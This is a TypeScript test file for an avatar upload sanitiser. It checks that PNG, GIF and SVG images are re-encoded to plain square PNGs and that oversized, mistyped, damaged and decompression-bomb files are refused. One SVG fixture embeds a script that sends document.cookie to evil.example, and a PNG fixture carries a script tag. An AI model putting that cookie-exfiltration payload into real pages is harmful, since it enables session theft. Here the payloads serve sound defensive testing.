import { crc32 } from 'node:zlib';
import { describe, expect, it } from 'vitest';
import pngjs from 'pngjs';
import omggif from 'omggif';
import * as jpeg from 'jpeg-js';
import { AvatarRefusal, avatarJpeg, normaliseAvatar, sniffAvatar, MAX_AVATAR_INPUT_BYTES } from './avatar-image.js';

function png(width: number, height: number, rgba: [number, number, number, number]): Buffer {
  const image = new pngjs.PNG({ width, height });
  for (let i = 0; i < image.data.length; i += 4) image.data.set(rgba, i);
  return pngjs.PNG.sync.write(image);
}

function gif(frames: Array<[number, number, number]>, side = 20): Buffer {
  const out = Buffer.alloc(64 * 1024);
  const writer = new omggif.GifWriter(out, side, side, { loop: 0 });
  for (const [r, g, b] of frames) {
    const palette = [(r << 16) | (g << 8) | b, 0];
    writer.addFrame(0, 0, side, side, new Array(side * side).fill(0), { palette, delay: 10 });
  }
  return out.subarray(0, writer.end());
}

function pixel(bytes: Buffer, x = 0, y = 0): number[] {
  const decoded = pngjs.PNG.sync.read(bytes);
  const i = (y * decoded.width + x) * 4;
  return [...decoded.data.subarray(i, i + 4)];
}

async function refusal(work: Promise<unknown>): Promise<AvatarRefusal> {
  const err = await work.then(() => null, (e: unknown) => e);
  expect(err).toBeInstanceOf(AvatarRefusal);
  return err as AvatarRefusal;
}

describe('normaliseAvatar', () => {
  it('re-encodes a PNG to a square of at most 512, cropped from the centre', async () => {
    const out = await normaliseAvatar(png(1200, 800, [200, 10, 10, 255]), 'image/png');
    expect(out.source).toBe('png');
    expect(out.side).toBe(512);
    const decoded = pngjs.PNG.sync.read(out.png);
    expect([decoded.width, decoded.height]).toEqual([512, 512]);
    expect(pixel(out.png, 256, 256)).toEqual([200, 10, 10, 255]);
    expect(out.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('keeps a small picture small, and square', async () => {
    const out = await normaliseAvatar(png(64, 40, [0, 0, 255, 128]));
    expect(out.side).toBe(40);
    expect(pixel(out.png)).toEqual([0, 0, 255, 128]);
  });

  it('drops everything but pixels: a text chunk does not survive', async () => {
    const source = png(10, 10, [1, 2, 3, 255]);
    // A tEXt chunk after IHDR, carrying markup; the output is written afresh.
    const text = Buffer.from('Comment\0<script>alert(1)</script>', 'latin1');
    const chunk = Buffer.alloc(12 + text.length);
    chunk.writeUInt32BE(text.length, 0);
    chunk.write('tEXt', 4, 'latin1');
    text.copy(chunk, 8);
    chunk.writeUInt32BE(crc32(chunk.subarray(4, 8 + text.length)), 8 + text.length);
    const withText = Buffer.concat([source.subarray(0, 33), chunk, source.subarray(33)]);
    expect(withText.toString('latin1')).toContain('<script>');
    const out = await normaliseAvatar(withText);
    expect(out.png.toString('latin1')).not.toContain('<script>');
  });

  it('turns a GIF into its first frame, as a PNG', async () => {
    const out = await normaliseAvatar(gif([[0, 255, 0], [255, 0, 0]]), 'image/gif');
    expect(out.source).toBe('gif');
    expect(out.png.subarray(1, 4).toString('latin1')).toBe('PNG');
    expect(pixel(out.png)).toEqual([0, 255, 0, 255]);
  });

  it('rasterises an SVG, script and remote references included, to plain pixels', async () => {
    const svg = Buffer.from(
      `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
        <script>fetch('https://evil.example/'+document.cookie)</script>
        <rect width="100" height="100" fill="#0000ff" onload="alert(1)"/>
        <image href="https://evil.example/x.png" width="10" height="10"/>
      </svg>`,
    );
    const out = await normaliseAvatar(svg, 'image/svg+xml');
    expect(out.source).toBe('svg');
    expect(out.side).toBe(512);
    expect(out.png.toString('latin1')).not.toMatch(/script|svg/i);
    expect(pixel(out.png, 256, 256)).toEqual([0, 0, 255, 255]);
  });

  it('fits a very tall SVG on its long side rather than drawing it huge', async () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="10000"><rect width="100" height="10000" fill="red"/></svg>');
    const out = await normaliseAvatar(svg);
    expect(out.side).toBeLessThanOrEqual(512);
  });

  it('refuses a file over 1 MB', async () => {
    const err = await refusal(normaliseAvatar(Buffer.alloc(MAX_AVATAR_INPUT_BYTES + 1, 0x89)));
    expect(err.status).toBe(413);
  });

  it('refuses what is not a PNG, GIF or SVG, whatever it claims to be', async () => {
    expect((await refusal(normaliseAvatar(Buffer.from('<html><script>1</script></html>'), 'image/png'))).status).toBe(415);
    expect((await refusal(normaliseAvatar(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0]), 'image/jpeg'))).status).toBe(415);
  });

  it('refuses a claimed type the bytes contradict', async () => {
    expect((await refusal(normaliseAvatar(png(4, 4, [0, 0, 0, 255]), 'image/svg+xml'))).status).toBe(415);
  });

  it('refuses a decompression bomb from its header, before inflating it', async () => {
    const small = png(1, 1, [0, 0, 0, 255]);
    small.writeUInt32BE(50_000, 16);
    small.writeUInt32BE(50_000, 20);
    expect((await refusal(normaliseAvatar(small))).message).toMatch(/too large/);
  });

  it('refuses a damaged PNG in words', async () => {
    const bytes = png(8, 8, [0, 0, 0, 255]);
    expect((await refusal(normaliseAvatar(bytes.subarray(0, 40)))).message).toMatch(/damaged/);
  });
});

describe('sniffAvatar', () => {
  it('reads the type from the bytes', () => {
    expect(sniffAvatar(png(1, 1, [0, 0, 0, 0]))).toBe('png');
    expect(sniffAvatar(gif([[0, 0, 0]]))).toBe('gif');
    expect(sniffAvatar(Buffer.from('﻿  <!-- hi --><svg viewBox="0 0 1 1"/>'))).toBe('svg');
    expect(sniffAvatar(Buffer.from('hello'))).toBeNull();
  });
});

describe('avatarJpeg', () => {
  it('is a 512 JPEG with transparency laid on white, for Telegram', async () => {
    const { png: stored } = await normaliseAvatar(png(32, 32, [0, 0, 0, 0]));
    const out = avatarJpeg(stored);
    const decoded = jpeg.decode(out);
    expect([decoded.width, decoded.height]).toEqual([512, 512]);
    expect(decoded.data[0]).toBeGreaterThan(240);
  });
});
